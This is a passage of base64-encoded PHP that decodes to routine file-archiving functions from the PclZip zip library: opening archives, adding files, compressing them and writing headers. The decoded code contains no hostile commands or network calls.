FkZEZpbGVMaXN0KCRwX2ZpbGVkZXNjcl9saXN0LCAkdl9oZWFkZXJfbGlzdCwgJHBfb3B0aW9ucykpICE9IDEpDQogIHsNCiAgICBmY2xvc2UoJHZfemlwX3RlbXBfZmQpOw0KICAgICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KICAgIEB1bmxpbmsoJHZfemlwX3RlbXBfbmFtZSk7DQogICAgJHRoaXMtPnByaXZTd2FwQmFja01hZ2ljUXVvdGVzKCk7DQoNCiAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICB9DQoNCiAgJHZfb2Zmc2V0ID0gQGZ0ZWxsKCR0aGlzLT56aXBfZmQpOw0KDQogICR2X3NpemUgPSAkdl9jZW50cmFsX2Rpclsnc2l6ZSddOw0KICB3aGlsZSAoJHZfc2l6ZSAhPSAwKQ0KICB7DQogICAgJHZfcmVhZF9zaXplID0gKCR2X3NpemUgPCBQQ0xaSVBfUkVBRF9CTE9DS19TSVpFID8gJHZfc2l6ZSA6IFBDTFpJUF9SRUFEX0JMT0NLX1NJWkUpOw0KICAgICR2X2J1ZmZlciA9IEBmcmVhZCgkdl96aXBfdGVtcF9mZCwgJHZfcmVhZF9zaXplKTsNCiAgICBAZndyaXRlKCR0aGlzLT56aXBfZmQsICR2X2J1ZmZlciwgJHZfcmVhZF9zaXplKTsNCiAgICAkdl9zaXplIC09ICR2X3JlYWRfc2l6ZTsNCiAgfQ0KDQogIGZvciAoJGk9MCwgJHZfY291bnQ9MDsgJGk8c2l6ZW9mKCR2X2hlYWRlcl9saXN0KTsgJGkrKykNCiAgew0KICAgIGlmICgkdl9oZWFkZXJfbGlzdFskaV1bJ3N0YXR1cyddID09ICdvaycpIHsNCiAgICAgIGlmICgoJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZXcml0ZUNlbnRyYWxGaWxlSGVhZGVyKCR2X2hlYWRlcl9saXN0WyRpXSkpICE9IDEpIHsNCiAgICAgICAgZmNsb3NlKCR2X3ppcF90ZW1wX2ZkKTsNCiAgICAgICAgJHRoaXMtPnByaXZDbG9zZUZkKCk7DQogICAgICAgIEB1bmxpbmsoJHZfemlwX3RlbXBfbmFtZSk7DQogICAgICAgICR0aGlzLT5wcml2U3dhcEJhY2tNYWdpY1F1b3RlcygpOw0KDQogICAgICAgIHJldHVybiAkdl9yZXN1bHQ7DQogICAgICB9DQogICAgICAkdl9jb3VudCsrOw0KICAgIH0NCg0KICAgICR0aGlzLT5wcml2Q29udmVydEhlYWRlcjJGaWxlSW5mbygkdl9oZWFkZXJfbGlzdFskaV0sICRwX3Jlc3VsdF9saXN0WyRpXSk7DQogIH0NCg0KICAkdl9jb21tZW50ID0gJHZfY2VudHJhbF9kaXJbJ2NvbW1lbnQnXTsNCiAgaWYgKGlzc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9DT01NRU5UXSkpIHsNCiAgICAkdl9jb21tZW50ID0gJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0NPTU1FTlRdOw0KICB9DQogIGlmIChpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9PUFRfQUREX0NPTU1FTlRdKSkgew0KICAgICR2X2NvbW1lbnQgPSAkdl9jb21tZW50LiRwX29wdGlvbnNbUENMWklQX09QVF9BRERfQ09NTUVOVF07DQogIH0NCiAgaWYgKGlzc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9QUkVQRU5EX0NPTU1FTlRdKSkgew0KICAgICR2X2NvbW1lbnQgPSAkcF9vcHRpb25zW1BDTFpJUF9PUFRfUFJFUEVORF9DT01NRU5UXS4kdl9jb21tZW50Ow0KICB9DQoNCiAgJHZfc2l6ZSA9IEBmdGVsbCgkdGhpcy0+emlwX2ZkKS0kdl9vZmZzZXQ7DQoNCiAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdldyaXRlQ2VudHJhbEhlYWRlcigkdl9jb3VudCskdl9jZW50cmFsX2RpclsnZW50cmllcyddLCAkdl9zaXplLCAkdl9vZmZzZXQsICR2X2NvbW1lbnQpKSAhPSAxKQ0KICB7DQogICAgdW5zZXQoJHZfaGVhZGVyX2xpc3QpOw0KICAgICR0aGlzLT5wcml2U3dhcEJhY2tNYWdpY1F1b3RlcygpOw0KDQogICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgfQ0KDQogICR2X3N3YXAgPSAkdGhpcy0+emlwX2ZkOw0KICAkdGhpcy0+emlwX2ZkID0gJHZfemlwX3RlbXBfZmQ7DQogICR2X3ppcF90ZW1wX2ZkID0gJHZfc3dhcDsNCg0KICAkdGhpcy0+cHJpdkNsb3NlRmQoKTsNCg0KICBAZmNsb3NlKCR2X3ppcF90ZW1wX2ZkKTsNCg0KICAkdGhpcy0+cHJpdlN3YXBCYWNrTWFnaWNRdW90ZXMoKTsNCg0KICBAdW5saW5rKCR0aGlzLT56aXBuYW1lKTsNCg0KICBQY2xaaXBVdGlsUmVuYW1lKCR2X3ppcF90ZW1wX25hbWUsICR0aGlzLT56aXBuYW1lKTsNCg0KICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQpmdW5jdGlvbiBwcml2T3BlbkZkKCRwX21vZGUpDQp7DQogICR2X3Jlc3VsdD0xOw0KDQogIGlmICgkdGhpcy0+emlwX2ZkICE9IDApDQogIHsNCiAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX1JFQURfT1BFTl9GQUlMLCAnWmlwIGZpbGUgXCcnLiR0aGlzLT56aXBuYW1lLidcJyBhbHJlYWR5IG9wZW4nKTsNCg0KICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICB9DQoNCiAgaWYgKCgkdGhpcy0+emlwX2ZkID0gQGZvcGVuKCR0aGlzLT56aXBuYW1lLCAkcF9tb2RlKSkgPT0gMCkNCiAgew0KICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfUkVBRF9PUEVOX0ZBSUwsICdVbmFibGUgdG8gb3BlbiBhcmNoaXZlIFwnJy4kdGhpcy0+emlwbmFtZS4nXCcgaW4gJy4kcF9tb2RlLicgbW9kZScpOw0KDQogICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogIH0NCg0KICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQpmdW5jdGlvbiBwcml2Q2xvc2VGZCgpDQp7DQogICR2X3Jlc3VsdD0xOw0KDQogIGlmICgkdGhpcy0+emlwX2ZkICE9IDApDQogICAgQGZjbG9zZSgkdGhpcy0+emlwX2ZkKTsNCiAgJHRoaXMtPnppcF9mZCA9IDA7DQoNCiAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KZnVuY3Rpb24gcHJpdkFkZExpc3QoJHBfZmlsZWRlc2NyX2xpc3QsICYkcF9yZXN1bHRfbGlzdCwgJiRwX29wdGlvbnMpDQp7DQogICR2X3Jlc3VsdD0xOw0KDQogICR2X2hlYWRlcl9saXN0ID0gYXJyYXkoKTsNCiAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdkFkZEZpbGVMaXN0KCRwX2ZpbGVkZXNjcl9saXN0LCAkdl9oZWFkZXJfbGlzdCwgJHBfb3B0aW9ucykpICE9IDEpDQogIHsNCiAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICB9DQoNCiAgJHZfb2Zmc2V0ID0gQGZ0ZWxsKCR0aGlzLT56aXBfZmQpOw0KDQogIGZvciAoJGk9MCwkdl9jb3VudD0wOyAkaTxzaXplb2YoJHZfaGVhZGVyX2xpc3QpOyAkaSsrKQ0KICB7DQogICAgaWYgKCR2X2hlYWRlcl9saXN0WyRpXVsnc3RhdHVzJ10gPT0gJ29rJykgew0KICAgICAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdldyaXRlQ2VudHJhbEZpbGVIZWFkZXIoJHZfaGVhZGVyX2xpc3RbJGldKSkgIT0gMSkgew0KICAgICAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICAgICAgfQ0KICAgICAgJHZfY291bnQrKzsNCiAgICB9DQoNCiAgICAkdGhpcy0+cHJpdkNvbnZlcnRIZWFkZXIyRmlsZUluZm8oJHZfaGVhZGVyX2xpc3RbJGldLCAkcF9yZXN1bHRfbGlzdFskaV0pOw0KICB9DQoNCiAgJHZfY29tbWVudCA9ICcnOw0KICBpZiAoaXNzZXQoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX0NPTU1FTlRdKSkgew0KICAgICR2X2NvbW1lbnQgPSAkcF9vcHRpb25zW1BDTFpJUF9PUFRfQ09NTUVOVF07DQogIH0NCg0KICAkdl9zaXplID0gQGZ0ZWxsKCR0aGlzLT56aXBfZmQpLSR2X29mZnNldDsNCg0KICBpZiAoKCR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2V3JpdGVDZW50cmFsSGVhZGVyKCR2X2NvdW50LCAkdl9zaXplLCAkdl9vZmZzZXQsICR2X2NvbW1lbnQpKSAhPSAxKQ0KICB7DQogICAgdW5zZXQoJHZfaGVhZGVyX2xpc3QpOw0KDQogICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgfQ0KDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIHByaXZBZGRGaWxlTGlzdCgkcF9maWxlZGVzY3JfbGlzdCwgJiRwX3Jlc3VsdF9saXN0LCAmJHBfb3B0aW9ucykNCnsNCiAgJHZfcmVzdWx0PTE7DQogICR2X2hlYWRlciA9IGFycmF5KCk7DQoNCiAgJHZfbmIgPSBzaXplb2YoJHBfcmVzdWx0X2xpc3QpOw0KDQogIGZvciAoJGo9MDsgKCRqPHNpemVvZigkcF9maWxlZGVzY3JfbGlzdCkpICYmICgkdl9yZXN1bHQ9PTEpOyAkaisrKSB7DQogICAgJHBfZmlsZWRlc2NyX2xpc3RbJGpdWydmaWxlbmFtZSddDQogICAgPSBQY2xaaXBVdGlsVHJhbnNsYXRlV2luUGF0aCgkcF9maWxlZGVzY3JfbGlzdFskal1bJ2ZpbGVuYW1lJ10sIGZhbHNlKTsNCiAgICANCg0KICAgIGlmICgkcF9maWxlZGVzY3JfbGlzdFskal1bJ2ZpbGVuYW1lJ10gPT0gIiIpIHsNCiAgICAgIGNvbnRpbnVlOw0KICAgIH0NCg0KICAgIGlmICggICAoJHBfZmlsZWRlc2NyX2xpc3RbJGpdWyd0eXBlJ10gIT0gJ3ZpcnR1YWxfZmlsZScpDQogICAgICAgICYmICghZmlsZV9leGlzdHMoJHBfZmlsZWRlc2NyX2xpc3RbJGpdWydmaWxlbmFtZSddKSkpIHsNCiAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfTUlTU0lOR19GSUxFLCAiRmlsZSAnIi4kcF9maWxlZGVzY3JfbGlzdFskal1bJ2ZpbGVuYW1lJ10uIicgZG9lcyBub3QgZXhpc3QiKTsNCiAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgIH0NCg0KICAgIGlmICggICAoJHBfZmlsZWRlc2NyX2xpc3RbJGpdWyd0eXBlJ10gPT0gJ2ZpbGUnKQ0KICAgICAgICB8fCAoJHBfZmlsZWRlc2NyX2xpc3RbJGpdWyd0eXBlJ10gPT0gJ3ZpcnR1YWxfZmlsZScpDQogICAgICAgIHx8ICggICAoJHBfZmlsZWRlc2NyX2xpc3RbJGpdWyd0eXBlJ10gPT0gJ2ZvbGRlcicpDQogICAgICAgICAgICAmJiAoICAgIWlzc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9SRU1PVkVfQUxMX1BBVEhdKQ0KICAgICAgICAgICAgICAgIHx8ICEkcF9vcHRpb25zW1BDTFpJUF9PUFRfUkVNT1ZFX0FMTF9QQVRIXSkpDQogICAgICAgICkgew0KDQogICAgICAkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdkFkZEZpbGUoJHBfZmlsZWRlc2NyX2xpc3RbJGpdLCAkdl9oZWFkZXIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBfb3B0aW9ucyk7DQogICAgICBpZiAoJHZfcmVzdWx0ICE9IDEpIHsNCiAgICAgICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgICAgIH0NCg0KICAgICAgJHBfcmVzdWx0X2xpc3RbJHZfbmIrK10gPSAkdl9oZWFkZXI7DQogICAgfQ0KICB9DQoNCiAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KZnVuY3Rpb24gcHJpdkFkZEZpbGUoJHBfZmlsZWRlc2NyLCAmJHBfaGVhZGVyLCAmJHBfb3B0aW9ucykNCnsNCiAgJHZfcmVzdWx0PTE7DQogIA0KICAkcF9maWxlbmFtZSA9ICRwX2ZpbGVkZXNjclsnZmlsZW5hbWUnXTsNCg0KICBpZiAoJHBfZmlsZW5hbWUgPT0gIiIpIHsNCiAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfUEFSQU1FVEVSLCAiSW52YWxpZCBmaWxlIGxpc3QgcGFyYW1ldGVyIChpbnZhbGlkIG9yIGVtcHR5IGxpc3QpIik7DQoNCiAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgfQ0KDQoNCiAgY2xlYXJzdGF0Y2FjaGUoKTsNCiAgJHBfaGVhZGVyWyd2ZXJzaW9uJ10gPSAyMDsNCiAgJHBfaGVhZGVyWyd2ZXJzaW9uX2V4dHJhY3RlZCddID0gMTA7DQogICRwX2hlYWRlclsnZmxhZyddID0gMDsNCiAgJHBfaGVhZGVyWydjb21wcmVzc2lvbiddID0gMDsNCiAgJHBfaGVhZGVyWydjcmMnXSA9IDA7DQogICRwX2hlYWRlclsnY29tcHJlc3NlZF9zaXplJ10gPSAwOw0KICAkcF9oZWFkZXJbJ2ZpbGVuYW1lX2xlbiddID0gc3RybGVuKCRwX2ZpbGVuYW1lKTsNCiAgJHBfaGVhZGVyWydleHRyYV9sZW4nXSA9IDA7DQogICRwX2hlYWRlclsnZGlzayddID0gMDsNCiAgJHBfaGVhZGVyWydpbnRlcm5hbCddID0gMDsNCiAgJHBfaGVhZGVyWydvZmZzZXQnXSA9IDA7DQogICRwX2hlYWRlclsnZmlsZW5hbWUnXSA9ICRwX2ZpbGVuYW1lOw0KICAkcF9oZWFkZXJbJ3N0b3JlZF9maWxlbmFtZSddID0gJHBfZmlsZWRlc2NyWydzdG9yZWRfZmlsZW5hbWUnXTsNCiAgJHBfaGVhZGVyWydleHRyYSddID0gJyc7DQogICRwX2hlYWRlclsnc3RhdHVzJ10gPSAnb2snOw0KICAkcF9oZWFkZXJbJ2luZGV4J10gPSAtMTsNCg0KICBpZiAoJHBfZmlsZWRlc2NyWyd0eXBlJ109PSdmaWxlJykgew0KICAgICRwX2hlYWRlclsnZXh0ZXJuYWwnXSA9IDB4MDAwMDAwMDA7DQogICAgJHBfaGVhZGVyWydzaXplJ10gPSBmaWxlc2l6ZSgkcF9maWxlbmFtZSk7DQogIH0NCiAgDQogIGVsc2UgaWYgKCRwX2ZpbGVkZXNjclsndHlwZSddPT0nZm9sZGVyJykgew0KICAgICRwX2hlYWRlclsnZXh0ZXJuYWwnXSA9IDB4MDAwMDAwMTA7DQogICAgJHBfaGVhZGVyWydtdGltZSddID0gZmlsZW10aW1lKCRwX2ZpbGVuYW1lKTsNCiAgICAkcF9oZWFkZXJbJ3NpemUnXSA9IGZpbGVzaXplKCRwX2ZpbGVuYW1lKTsNCiAgfQ0KICANCiAgZWxzZSBpZiAoJHBfZmlsZWRlc2NyWyd0eXBlJ10gPT0gJ3ZpcnR1YWxfZmlsZScpIHsNCiAgICAkcF9oZWFkZXJbJ2V4dGVybmFsJ10gPSAweDAwMDAwMDAwOw0KICAgICRwX2hlYWRlclsnc2l6ZSddID0gc3RybGVuKCRwX2ZpbGVkZXNjclsnY29udGVudCddKTsNCiAgfQ0KICANCg0KICBpZiAoaXNzZXQoJHBfZmlsZWRlc2NyWydtdGltZSddKSkgew0KICAgICRwX2hlYWRlclsnbXRpbWUnXSA9ICRwX2ZpbGVkZXNjclsnbXRpbWUnXTsNCiAgfQ0KICBlbHNlIGlmICgkcF9maWxlZGVzY3JbJ3R5cGUnXSA9PSAndmlydHVhbF9maWxlJykgew0KICAgICRwX2hlYWRlclsnbXRpbWUnXSA9IHRpbWUoKTsNCiAgfQ0KICBlbHNlIHsNCiAgICAkcF9oZWFkZXJbJ210aW1lJ10gPSBmaWxlbXRpbWUoJHBfZmlsZW5hbWUpOw0KICB9DQoNCiAgaWYgKGlzc2V0KCRwX2ZpbGVkZXNjclsnY29tbWVudCddKSkgew0KICAgICRwX2hlYWRlclsnY29tbWVudF9sZW4nXSA9IHN0cmxlbigkcF9maWxlZGVzY3JbJ2NvbW1lbnQnXSk7DQogICAgJHBfaGVhZGVyWydjb21tZW50J10gPSAkcF9maWxlZGVzY3JbJ2NvbW1lbnQnXTsNCiAgfQ0KICBlbHNlIHsNCiAgICAkcF9oZWFkZXJbJ2NvbW1lbnRfbGVuJ10gPSAwOw0KICAgICRwX2hlYWRlclsnY29tbWVudCddID0gJyc7DQogIH0NCg0KICBpZiAoaXNzZXQoJHBfb3B0aW9uc1tQQ0xaSVBfQ0JfUFJFX0FERF0pKSB7DQoNCiAgICAkdl9sb2NhbF9oZWFkZXIgPSBhcnJheSgpOw0KICAgICR0aGlzLT5wcml2Q29udmVydEhlYWRlcjJGaWxlSW5mbygkcF9oZWFkZXIsICR2X2xvY2FsX2hlYWRlcik7DQoNCiAgICAkdl9yZXN1bHQgPSAkcF9vcHRpb25zW1BDTFpJUF9DQl9QUkVfQUREXShQQ0xaSVBfQ0JfUFJFX0FERCwgJHZfbG9jYWxfaGVhZGVyKTsNCiAgICBpZiAoJHZfcmVzdWx0ID09IDApIHsNCiAgICAgICRwX2hlYWRlclsnc3RhdHVzJ10gPSAic2tpcHBlZCI7DQogICAgICAkdl9yZXN1bHQgPSAxOw0KICAgIH0NCg0KICAgIGlmICgkcF9oZWFkZXJbJ3N0b3JlZF9maWxlbmFtZSddICE9ICR2X2xvY2FsX2hlYWRlclsnc3RvcmVkX2ZpbGVuYW1lJ10pIHsNCiAgICAgICRwX2hlYWRlclsnc3RvcmVkX2ZpbGVuYW1lJ10gPSBQY2xaaXBVdGlsUGF0aFJlZHVjdGlvbigkdl9sb2NhbF9oZWFkZXJbJ3N0b3JlZF9maWxlbmFtZSddKTsNCiAgICB9DQogIH0NCg0KICBpZiAoJHBfaGVhZGVyWydzdG9yZWRfZmlsZW5hbWUnXSA9PSAiIikgew0KICAgICRwX2hlYWRlclsnc3RhdHVzJ10gPSAiZmlsdGVyZWQiOw0KICB9DQogIA0KICBpZiAoc3RybGVuKCRwX2hlYWRlclsnc3RvcmVkX2ZpbGVuYW1lJ10pID4gMHhGRikgew0KICAgICRwX2hlYWRlclsnc3RhdHVzJ10gPSAnZmlsZW5hbWVfdG9vX2xvbmcnOw0KICB9DQoNCiAgaWYgKCRwX2hlYWRlclsnc3RhdHVzJ10gPT0gJ29rJykgew0KDQogICAgaWYgKCRwX2ZpbGVkZXNjclsndHlwZSddID09ICdmaWxlJykgew0KICAgICAgaWYgKCAoIWlzc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9URU1QX0ZJTEVfT0ZGXSkpIA0KICAgICAgICAgICYmIChpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9PUFRfVEVNUF9GSUxFX09OXSkNCiAgICAgICAgICAgICAgfHwgKGlzc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9URU1QX0ZJTEVfVEhSRVNIT0xEXSkNCiAgICAgICAgICAgICAgICAgICYmICgkcF9vcHRpb25zW1BDTFpJUF9PUFRfVEVNUF9GSUxFX1RIUkVTSE9MRF0gPD0gJHBfaGVhZGVyWydzaXplJ10pKSApICkgew0KICAgICAgICAkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdkFkZEZpbGVVc2luZ1RlbXBGaWxlKCRwX2ZpbGVkZXNjciwgJHBfaGVhZGVyLCAkcF9vcHRpb25zKTsNCiAgICAgICAgaWYgKCR2X3Jlc3VsdCA8IFBDTFpJUF9FUlJfTk9fRVJST1IpIHsNCiAgICAgICAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICAgICAgICB9DQogICAgICB9DQogICAgICANCiAgICAgIGVsc2Ugew0KDQogICAgICBpZiAoKCR2X2ZpbGUgPSBAZm9wZW4oJHBfZmlsZW5hbWUsICJyYiIpKSA9PSAwKSB7DQogICAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfUkVBRF9PUEVOX0ZBSUwsICJVbmFibGUgdG8gb3BlbiBmaWxlICckcF9maWxlbmFtZScgaW4gYmluYXJ5IHJlYWQgbW9kZSIpOw0KICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgIH0NCg0KICAgICAgJHZfY29udGVudCA9IEBmcmVhZCgkdl9maWxlLCAkcF9oZWFkZXJbJ3NpemUnXSk7DQoNCiAgICAgIEBmY2xvc2UoJHZfZmlsZSk7DQoNCiAgICAgICRwX2hlYWRlclsnY3JjJ10gPSBAY3JjMzIoJHZfY29udGVudCk7DQogICAgICANCiAgICAgIGlmICgkcF9vcHRpb25zW1BDTFpJUF9PUFRfTk9fQ09NUFJFU1NJT05dKSB7DQogICAgICAgICRwX2hlYWRlclsnY29tcHJlc3NlZF9zaXplJ10gPSAkcF9oZWFkZXJbJ3NpemUnXTsNCiAgICAgICAgJHBfaGVhZGVyWydjb21wcmVzc2lvbiddID0gMDsNCiAgICAgIH0NCiAgICAgIA0KICAgICAgZWxzZSB7DQogICAgICAgICR2X2NvbnRlbnQgPSBAZ3pkZWZsYXRlKCR2X2NvbnRlbnQpOw0KDQogICAgICAgICRwX2hlYWRlclsnY29tcHJlc3NlZF9zaXplJ10gPSBzdHJsZW4oJHZfY29udGVudCk7DQogICAgICAgICRwX2hlYWRlclsnY29tcHJlc3Npb24nXSA9IDg7DQogICAgICB9DQogICAgICANCiAgICAgIGlmICgoJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZXcml0ZUZpbGVIZWFkZXIoJHBfaGVhZGVyKSkgIT0gMSkgew0KICAgICAgICBAZmNsb3NlKCR2X2ZpbGUpOw0KICAgICAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICAgICAgfQ0KDQogICAgICBAZndyaXRlKCR0aGlzLT56aXBfZmQsICR2X2NvbnRlbnQsICRwX2hlYWRlclsnY29tcHJlc3NlZF9zaXplJ10pOw0KDQogICAgICB9DQoNCiAgICB9DQoNCiAgICBlbHNlIGlmICgkcF9maWxlZGVzY3JbJ3R5cGUnXSA9PSAndmlydHVhbF9maWxlJykgew0KICAgICAgICANCiAgICAgICR2X2NvbnRlbnQgPSAkcF9maWxlZGVzY3JbJ2NvbnRlbnQnXTsNCg0KICAgICAgJHBfaGVhZGVyWydjcmMnXSA9IEBjcmMzMigkdl9jb250ZW50KTsNCiAgICAgIA0KICAgICAgaWYgKCRwX29wdGlvbnNbUENMWklQX09QVF9OT19DT01QUkVTU0lPTl0pIHsNCiAgICAgICAgJHBfaGVhZGVyWydjb21wcmVzc2VkX3NpemUnXSA9ICRwX2hlYWRlclsnc2l6ZSddOw0KICAgICAgICAkcF9oZWFkZXJbJ2NvbXByZXNzaW9uJ10gPSAwOw0KICAgICAgfQ0KICAgICAgDQogICAgICBlbHNlIHsNCiAgICAgICAgJHZfY29udGVudCA9IEBnemRlZmxhdGUoJHZfY29udGVudCk7DQoNCiAgICAgICAgJHBfaGVhZGVyWydjb21wcmVzc2VkX3NpemUnXSA9IHN0cmxlbigkdl9jb250ZW50KTsNCiAgICAgICAgJHBfaGVhZGVyWydjb21wcmVzc2lvbiddID0gODsNCiAgICAgIH0NCiAgICAgIA0KICAgICAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdldyaXRlRmlsZUhlYWRlcigkcF9oZWFkZXIpKSAhPSAxKSB7DQogICAgICAgIEBmY2xvc2UoJHZfZmlsZSk7DQogICAgICAgIHJldHVybiAkdl9yZXN1bHQ7DQogICAgICB9DQoNCiAgICAgIEBmd3JpdGUoJHRoaXMtPnppcF9mZCwgJHZfY29udGVudCwgJHBfaGVhZGVyWydjb21wcmVzc2VkX3NpemUnXSk7DQogICAgfQ0KDQogICAgZWxzZSBpZiAoJHBfZmlsZWRlc2NyWyd0eXBlJ10gPT0gJ2ZvbGRlcicpIHsNCiAgICAgIGlmIChAc3Vic3RyKCRwX2hlYWRlclsnc3RvcmVkX2ZpbGVuYW1lJ10sIC0xKSAhPSAnLycpIHsNCiAgICAgICAgJHBfaGVhZGVyWydzdG9yZWRfZmlsZW5hbWUnXSAuPSAnLyc7DQogICAgICB9DQoNCiAgICAgICRwX2hlYWRlclsnc2l6ZSddID0gMDsNCg0KICAgICAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdldyaXRlRmlsZUhlYWRlcigkcF9oZWFkZXIpKSAhPSAxKQ0KICAgICAgew0KICAgICAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICAgICAgfQ0KICAgIH0NCiAgfQ0KDQogIGlmIChpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9DQl9QT1NUX0FERF0pKSB7DQoNCiAgICAkdl9sb2NhbF9oZWFkZXIgPSBhcnJheSgpOw0KICAgICR0aGlzLT5wcml2Q29udmVydEhlYWRlcjJGaWxlSW5mbygkcF9oZWFkZXIsICR2X2xvY2FsX2hlYWRlcik7DQoNCiAgICAkdl9yZXN1bHQgPSAkcF9vcHRpb25zW1BDTFpJUF9DQl9QT1NUX0FERF0oUENMWklQX0NCX1BPU1RfQURELCAkdl9sb2NhbF9oZWFkZXIpOw0KICAgIGlmICgkdl9yZXN1bHQgPT0gMCkgew0KICAgICAgJHZfcmVzdWx0ID0gMTsNCiAgICB9DQoNCiAgfQ0KDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIHByaXZBZGRGaWxlVXNpbmdUZW1wRmlsZSgkcF9maWxlZGVzY3IsICYkcF9oZWFkZXIsICYkcF9vcHRpb25zKQ0Kew0KICAkdl9yZXN1bHQ9UENMWklQX0VSUl9OT19FUlJPUjsNCiAgDQogICRwX2ZpbGVuYW1lID0gJHBfZmlsZWRlc2NyWydmaWxlbmFtZSddOw0KDQoNCiAgaWYgKCgkdl9maWxlID0gQGZvcGVuKCRwX2ZpbGVuYW1lLCAicmIiKSkgPT0gMCkgew0KICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfUkVBRF9PUEVOX0ZBSUwsICJVbmFibGUgdG8gb3BlbiBmaWxlICckcF9maWxlbmFtZScgaW4gYmluYXJ5IHJlYWQgbW9kZSIpOw0KICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICB9DQoNCiAgJHZfZ3ppcF90ZW1wX25hbWUgPSBQQ0xaSVBfVEVNUE9SQVJZX0RJUi51bmlxaWQoJ3BjbHppcC0nKS4nLmd6JzsNCiAgaWYgKCgkdl9maWxlX2NvbXByZXNzZWQgPSBAZ3pvcGVuKCR2X2d6aXBfdGVtcF9uYW1lLCAid2IiKSkgPT0gMCkgew0KICAgIGZjbG9zZSgkdl9maWxlKTsNCiAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX1dSSVRFX09QRU5fRkFJTCwgJ1VuYWJsZSB0byBvcGVuIHRlbXBvcmFyeSBmaWxlIFwnJy4kdl9nemlwX3RlbXBfbmFtZS4nXCcgaW4gYmluYXJ5IHdyaXRlIG1vZGUnKTsNCiAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgfQ0KDQogICR2X3NpemUgPSBmaWxlc2l6ZSgkcF9maWxlbmFtZSk7DQogIHdoaWxlICgkdl9zaXplICE9IDApIHsNCiAgICAkdl9yZWFkX3NpemUgPSAoJHZfc2l6ZSA8IFBDTFpJUF9SRUFEX0JMT0NLX1NJWkUgPyAkdl9zaXplIDogUENMWklQX1JFQURfQkxPQ0tfU0laRSk7DQogICAgJHZfYnVmZmVyID0gQGZyZWFkKCR2X2ZpbGUsICR2X3JlYWRfc2l6ZSk7DQogICAgQGd6cHV0cygkdl9maWxlX2NvbXByZXNzZWQsICR2X2J1ZmZlciwgJHZfcmVhZF9zaXplKTsNCiAgICAkdl9zaXplIC09ICR2X3JlYWRfc2l6ZTsNCiAgfQ0KDQogIEBmY2xvc2UoJHZfZmlsZSk7DQogIEBnemNsb3NlKCR2X2ZpbGVfY29tcHJlc3NlZCk7DQoNCiAgaWYgKGZpbGVzaXplKCR2X2d6aXBfdGVtcF9uYW1lKSA8IDE4KSB7DQogICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9CQURfRk9STUFULCAnZ3ppcCB0ZW1wb3JhcnkgZmlsZSBcJycuJHZfZ3ppcF90ZW1wX25hbWUuJ1wnIGhhcyBpbnZhbGlkIGZpbGVzaXplIC0gc2hvdWxkIGJlIG1pbmltdW0gMTggYnl0ZXMnKTsNCiAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgfQ0KDQogIGlmICgoJHZfZmlsZV9jb21wcmVzc2VkID0gQGZvcGVuKCR2X2d6aXBfdGVtcF9uYW1lLCAicmIiKSkgPT0gMCkgew0KICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfUkVBRF9PUEVOX0ZBSUwsICdVbmFibGUgdG8gb3BlbiB0ZW1wb3JhcnkgZmlsZSBcJycuJHZfZ